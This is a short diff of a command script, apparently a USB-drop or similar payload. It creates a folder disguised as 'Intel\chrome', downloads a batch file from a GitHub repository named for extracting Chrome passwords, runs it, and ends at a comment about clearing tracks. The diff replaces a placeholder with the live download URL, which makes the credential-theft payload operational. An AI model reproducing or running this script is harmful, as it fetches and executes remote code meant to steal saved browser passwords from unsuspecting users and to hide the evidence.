@@ -1,5 +1,5 @@
 cd /;md Intel;cd Intel;md chrome;cd chrome;
-wget PASTE-YOUR-LINK-HERE -OutFile cpv.bat
+wget https://raw.githubusercontent.com/exploitechx/chrome-password-extractor/master/cpv.bat -OutFile cpv.bat
 start cpv.bat
 
  // --> Clearing your tracks
